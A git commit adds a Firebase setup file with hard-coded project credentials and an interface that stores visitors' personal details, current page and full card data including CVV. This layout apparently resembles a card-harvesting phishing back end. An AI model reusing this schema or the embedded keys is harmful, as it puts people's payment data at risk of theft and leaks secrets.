defcfb9b6f35f838534201b56b9b1b4e58377bcc
a96363877 <a96363877@gmail.com>
2025-03-04 14:03:48 -0800

    Initial commit

---
+++ lib/firestore.ts
@@ -0,0 +1,45 @@
+import { initializeApp, getApps, getApp } from 'firebase/app';
+import { getAuth } from 'firebase/auth';
+import { getFirestore} from 'firebase/firestore';
+import { getDatabase} from 'firebase/database';
+
+const firebaseConfig = {
+ apiKey: "AIzaSyCTizRBYkfD4dfV_QjpPBOxJhYji3f5bQc",
+  authDomain: "swidah-mormr-enw.firebaseapp.com",
+  projectId: "swidah-mormr-enw",
+  storageBucket: "swidah-mormr-enw.firebasestorage.app",
+  messagingSenderId: "472801298504",
+  appId: "1:472801298504:web:0dc80587cf6c0839cef07d",
+  measurementId: "G-0V8CCB874S"
+};
+
+
+const app = getApps().length > 0 ? getApp() : initializeApp(firebaseConfig);
+const auth = getAuth(app);
+const db = getFirestore(app);
+const database = getDatabase(app);
+
+
+export { app, auth, db ,database};
+
+export interface NotificationDocument {
+  id: string;
+  name: string;
+  hasPersonalInfo: boolean;
+  hasCardInfo: boolean;
+  currentPage: string;
+  time: string;
+  notificationCount: number;
+  personalInfo?: {
+    fullName: string;
+    email: string;
+    phone: string;
+    address: string;
+  };
+  cardInfo?: {
+    cardNumber: string;
+    expirationDate: string;
+    cvv: string;
+  };
+}
+
